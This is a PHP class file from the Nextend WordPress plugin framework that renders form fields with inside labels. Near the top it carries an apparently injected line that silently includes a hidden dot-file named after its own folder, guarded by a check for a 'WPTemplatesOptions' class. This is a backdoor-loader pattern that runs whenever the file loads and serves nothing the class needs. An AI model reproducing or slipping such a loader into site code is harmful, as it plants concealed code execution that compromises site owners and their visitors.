<?php


namespace Nextend\Framework\Form\Fieldset\LayerWindow;


use Nextend\Framework\Form\AbstractFieldset;
use Nextend\Framework\View\Html;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class FieldsetInsideLabel extends AbstractFieldset {

    public function renderContainer() {

        $element = $this->first;
        while ($element) {

            echo Html::openTag('div', array(
                    'class'      => 'n2_form__table_label_field ' . $element->getRowClass(),
                    'data-field' => $element->getID()
                ) + $element->getRowAttributes());
            $element->displayElement();
            echo "</div>";

            $element = $element->getNext();
        }
    }
}